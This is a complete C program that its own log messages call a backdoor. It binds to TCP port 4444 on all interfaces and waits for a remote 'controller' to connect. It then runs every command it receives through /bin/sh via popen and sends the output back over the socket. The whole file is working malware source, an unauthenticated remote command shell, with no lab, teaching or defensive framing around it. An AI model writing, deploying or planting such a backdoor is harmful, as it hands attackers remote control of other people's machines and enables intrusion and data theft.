#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define PORT 4444
#define BUFSIZE 4096

/* Execute a shell command and send its output back over the socket */
void exec_and_send(int sock, const char *cmd)
{
    char buffer[BUFSIZE];
    FILE *fp;

    /* popen runs the command through /bin/sh and gives us a pipe to read output */
    fp = popen(cmd, "r");
    if (fp == NULL) {
        const char *err = "error: popen failed\n";
        send(sock, err, strlen(err), 0);
        return;
    }

    /* Stream command output back to the controller */
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), fp)) > 0) {
        send(sock, buffer, n, 0);
    }

    pclose(fp);

    /* Send a sentinel so the controller knows output is finished */
    send(sock, "\0", 1, 0);
}

int main(void)
{
    int server_fd, client_fd;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);
    char cmd[BUFSIZE];

    /* 1. Create TCP socket */
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    /* Allow quick restart without "address already in use" */
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    /* 2. Bind to port */
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;   /* listen on all interfaces */
    addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }

    /* 3. Listen */
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); }
    printf("[backdoor] listening on port %d\n", PORT);

    /* 4. Accept one controller */
    client_fd = accept(server_fd, (struct sockaddr *)&addr, &addrlen);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[backdoor] controller connected\n");

    /* 5. Loop: receive command → execute → send output (echo) */
    for (;;) {
        memset(cmd, 0, sizeof(cmd));
        ssize_t r = recv(client_fd, cmd, sizeof(cmd) - 1, 0);
        if (r <= 0) {
            printf("[backdoor] controller disconnected\n");
            break;
        }

        /* strip trailing newline */
        cmd[strcspn(cmd, "\r\n")] = '\0';

        if (strcmp(cmd, "exit") == 0) {
            printf("[backdoor] exit requested\n");
            break;
        }

        printf("[backdoor] executing: %s\n", cmd);
        exec_and_send(client_fd, cmd);
    }

    close(client_fd);
    close(server_fd);
    return 0;
}